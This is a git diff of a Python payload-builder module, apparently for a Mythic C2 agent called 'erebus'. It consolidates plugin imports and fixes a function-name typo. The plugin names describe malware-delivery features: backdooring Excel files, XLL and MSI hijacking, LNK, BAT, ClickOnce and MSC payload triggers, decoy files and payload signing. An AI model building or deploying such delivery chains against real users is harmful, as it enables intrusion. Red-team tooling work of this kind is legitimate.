@@ -30,85 +30,11 @@ _PLUGIN_FUNCTIONS = [
     "backdoor_existing_excel",
     "generate_xll_template",
     "register_xll_function",
+    "create_msc_explorer_trigger",
 ]
 
-<<<<<<< HEAD
-try:
-    from erebus_wrapper.erebus.modules.archive.container_clickonce import build_clickonce
-except ImportError:
-    build_clickonce = _plugin_loader.get_function("build_clickonce")
-
-try:
-    from erebus_wrapper.erebus.modules.archive.container_msi import (
-        build_msi,
-        hijack_msi,
-    )
-except ImportError:
-    build_msi = _plugin_loader.get_function("build_msi")
-    hijack_msi = _plugin_loader.get_function("hijack_msi")
-    add_multiple_files_to_msi = _plugin_loader.get_function("add_multiple_files_to_msi")
-
-try:
-    from erebus_wrapper.erebus.modules.archive.trigger_lnk import create_payload_trigger
-except ImportError:
-    create_payload_trigger = _plugin_loader.get_function("create_payload_trigger")
-
-try:
-    from erebus_wrapper.erebus.modules.archive.trigger_bat import create_bat_payload_trigger
-except ImportError:
-    create_bat_payload_trigger = _plugin_loader.get_function("create_bat_payload_trigger")
-
-try:
-    from erebus_wrapper.erebus.modules.archive.trigger_msi import create_msi_payload_trigger
-except ImportError:
-    create_msi_payload_trigger = _plugin_loader.get_function("create_msi_payload_trigger")
-
-try:
-    from erebus_wrapper.erebus.modules.archive.trigger_clickonce import create_clickonce_trigger
-except ImportError:
-    create_clickonce_trigger = _plugin_loader.get_function("create_clickonce_trigger")
-
-try:
-    from erebus_wrapper.erebus.modules.archive.container_archive import build_7z, build_zip
-except ImportError:
-    build_7z = _plugin_loader.get_function("build_7z")
-    build_zip = _plugin_loader.get_function("build_zip")
-
-try:
-    from erebus_wrapper.erebus.modules.archive.container_iso import build_iso
-except ImportError:
-    build_iso = _plugin_loader.get_function("build_iso")
-
-try:
-    from erebus_wrapper.erebus.modules.archive.codesigner import self_sign_payload, get_remote_cert_details, sign_with_provided_cert
-except ImportError:
-    self_sign_payload = _plugin_loader.get_function("self_sign_payload")
-    get_remote_cert_details = _plugin_loader.get_function("get_remote_cert_details")
-    sign_with_provided_cert = _plugin_loader.get_function("sign_with_provided_cert")
-
-try:
-    from erebus_wrapper.erebus.modules.plugin_payload_maldocs import (
-        backdoor_existing_excel,
-        generate_xll_template,
-        register_xll_function
-    )
-except ImportError:
-    generate_excel_payload = _plugin_loader.get_function("generate_excel_payload")
-    backdoor_existing_excel = _plugin_loader.get_function("backdoor_existing_excel")
-    generate_xll_template = _plugin_loader.get_function("generate_xll_template")
-    register_xll_function = _plugin_loader.get_function("register_xll_function")
-
-try:
-    from erebus_wrapper.erebus.modules.plugin_trigger_msc import create_msc_explorer_trigger
-except ImportError:
-    create_msc_explorer_trigger = _plugin_loader.get_function("create_msc_explorer_trigger")
-
-
-# ==================== End Plugin System ====================
-=======
 for _func_name in _PLUGIN_FUNCTIONS:
     globals()[_func_name] = _plugin_loader.get_function(_func_name)
->>>>>>> 5fbb0b4 (Removed DLL Hijacking)
 
 from mythic_container.PayloadBuilder import *
 from mythic_container.MythicCommandBase import *
@@ -3209,7 +3135,7 @@ static size_t key_len = sizeof(key);
                                 decoy_file=decoy_file
                             )
                         case "ClickOnce":
-                            trigger_path = await create_1clickonce_trigger(
+                            trigger_path = await create_clickonce_trigger(
                                 payload_exe="erebus.exe",
                                 payload_dir=payload_dir,
                                 decoy_file=decoy_file,
